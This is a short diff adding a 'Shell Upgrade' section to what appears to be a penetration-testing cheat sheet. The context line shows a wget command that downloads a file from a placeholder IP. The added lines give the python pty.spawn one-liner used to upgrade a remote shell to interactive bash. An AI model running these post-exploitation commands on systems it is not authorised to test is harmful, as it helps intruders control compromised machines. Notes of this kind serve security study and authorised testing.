@@ -376,5 +376,20 @@ wget http://{IP ADDRESS}/{FILE} -outfile {FILE}
 
 ## Windows
 
+# Shell Upgrade
 
+<br />
 
+## Python
+
+<br />
+
+```bash
+# About: A command spawn a new shell using python
+# Download: MAy or may not be installed on server machine
+
+# Usage 
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+python -c 'import pty;pty.spawn("/bin/bash")'
+```
